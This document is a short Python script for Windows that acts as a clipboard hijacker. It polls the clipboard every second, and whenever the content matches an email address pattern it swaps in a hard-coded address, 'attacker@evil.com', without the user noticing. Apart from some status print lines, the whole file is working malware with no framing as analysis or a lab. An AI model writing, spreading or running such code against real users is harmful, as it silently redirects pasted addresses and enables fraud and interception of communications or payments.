import win32clipboard  # ty:ignore[unresolved-import]
import re
from time import sleep

attacker_email = "attacker@evil.com"
email_regex = "^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$"


while True:
    win32clipboard.OpenClipboard()
    try:
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT).rstrip()
    except TypeError as _t_e:
        print("Failed.")
        sleep(1)
        continue

    print("Checking...")
    if re.search(email_regex, data):
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(attacker_email)
        print("Success!")
    else:
        print("Nothing.")

    win32clipboard.CloseClipboard()
    sleep(1)
